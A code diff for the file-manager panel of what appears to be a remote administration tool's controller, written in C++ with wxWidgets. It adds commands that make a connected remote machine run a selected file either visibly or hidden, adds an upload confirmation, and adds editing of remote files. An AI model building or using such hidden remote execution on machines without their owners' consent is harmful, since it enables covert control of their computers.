@@ -16,6 +16,8 @@ wxBEGIN_EVENT_TABLE(ListCtrlManager, wxListCtrl)
 	EVT_MENU(EnumMenuFM::ID_New_Archivo, ListCtrlManager::OnCrearArchivo)
 	EVT_MENU(EnumMenuFM::ID_Eliminar, ListCtrlManager::OnBorrarArchivo)
 	EVT_MENU(EnumMenuFM::ID_Editar, ListCtrlManager::OnEditarArchivo)
+	EVT_MENU(EnumMenuFM::ID_Exec_Visible, ListCtrlManager::OnEjecutarArchivo_Visible)
+	EVT_MENU(EnumMenuFM::ID_Exec_Oculto, ListCtrlManager::OnEjecutarArchivo_Oculto)
 	EVT_MENU(EnumMenuFM::ID_Descargar, ListCtrlManager::OnDescargarArchivo)
 	EVT_CONTEXT_MENU(ListCtrlManager::OnContextMenu)
 	EVT_LIST_ITEM_ACTIVATED(EnumIDS::ID_Panel_FM_List, ListCtrlManager::OnActivated)
@@ -272,6 +274,8 @@ void panelFileManager::EnviarArchivo(const std::string lPath, const char* rPath,
 		delete[] cBufferArchivo;
 		cBufferArchivo = nullptr;
 	}
+	
+	wxMessageBox("Archivo enviado!", "Upload", wxOK);
 }
 
 wxString panelFileManager::RutaActual() {
@@ -363,23 +367,33 @@ void ListCtrlManager::OnDescargarArchivo(wxCommandEvent& event) {
 	}
 
 	lock.unlock();
-	
-	/*struct TransferStatus nueva_transfer;
-	nueva_transfer.isUpload = false;
-	nueva_transfer.strCliente = this->itemp->strID;
-	nueva_transfer.strNombre = this->GetItemText(item, 1);
-	nueva_transfer.uDescargado = nueva_transfer.uTamano = 0;
-		
-	//Agregar nueva transfer al vector del server
-	p_Servidor->vcTransferencias.push_back(nueva_transfer);
-
-	lock1.unlock();*/
 
 	this->itemp->EnviarComando(strComando);
 }
 
+void ListCtrlManager::OnEjecutarArchivo_Visible(wxCommandEvent& event) {
+	std::string strComando = std::to_string(EnumComandos::FM_Ejecutar_Archivo);
+	strComando.append(1, '~');
+	strComando += this->itemp->p_RutaActual->GetLabelText();
+	strComando += this->ArchivoSeleccionado();
+	strComando.append(1, '~');
+	strComando.append(1, '1');
+	this->itemp->EnviarComando(strComando);
+}
+
+void ListCtrlManager::OnEjecutarArchivo_Oculto(wxCommandEvent& event) {
+	std::string strComando = std::to_string(EnumComandos::FM_Ejecutar_Archivo);
+	strComando.append(1, '~');
+	strComando += this->itemp->p_RutaActual->GetLabelText();
+	strComando += this->ArchivoSeleccionado();
+	strComando.append(1, '~');
+	strComando.append(1, '0');
+	this->itemp->EnviarComando(strComando);
+}
+
 void ListCtrlManager::OnEditarArchivo(wxCommandEvent& event) {
-	wxEditForm* editor_txt = new wxEditForm(this, "random.txt");
+	wxString strFile = this->ArchivoSeleccionado();
+	wxEditForm* editor_txt = new wxEditForm(this, "[REMOTO]" + strFile);
 	editor_txt->Show(true);
 }
 
